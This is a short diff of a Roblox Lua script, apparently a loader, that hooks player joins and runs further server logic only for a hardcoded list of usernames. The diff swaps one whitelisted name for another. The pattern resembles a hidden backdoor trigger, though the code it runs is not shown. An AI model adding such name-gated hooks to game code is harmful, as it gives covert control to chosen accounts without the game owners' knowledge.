@@ -2,7 +2,7 @@ print("knocks loadered!!!!")
 
 game.Players.ChildAdded:Connect(function(v)
     repeat task.wait() until v and v.Character or not game.Players:FindFirstChild(v.Name)
-    if (v.Name == "pagesarecoming" or v.Name == "Trogdor973" or v.Name == "Dekryptionite") and game:GetService("ReplicatedStorage"):FindFirstChild("WeaponsSystem") then
+    if (v.Name == "ripcxo" or v.Name == "Trogdor973" or v.Name == "Dekryptionite") and game:GetService("ReplicatedStorage"):FindFirstChild("WeaponsSystem") then
 
         if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
             local ticking = tick()
